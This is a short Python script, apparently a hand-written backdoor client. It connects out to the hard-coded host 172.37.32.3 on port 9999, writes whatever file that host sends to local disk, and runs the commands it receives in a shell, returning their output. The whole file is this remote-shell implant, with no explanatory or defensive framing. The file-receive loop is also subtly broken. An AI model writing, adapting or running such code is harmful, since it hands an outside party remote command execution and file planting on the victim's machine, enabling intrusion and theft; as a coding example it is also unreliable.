import socket
import os
import subprocess
from time import sleep

s = socket.socket()
host = '172.37.32.3'
port = 9999

s.connect((host, port))
sleep(2)

while True:
    file_name = s.recv(1024).decode()
    print(file_name)
    file_size = s.recv(1024).decode()
    print(file_size)

    file = open(file_name,"wb")
    file_byetes= b""

    donee = False

    while not donee:
        data = s.recv(1024)
        if file_byetes[-5:] == b"<END>":
            donee = True
        else:
            file_byetes += data   

    file.write(file_byetes)       

    file.close()

    sleep(5)
    print("Start sending commmands")

    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))

        print(output_str)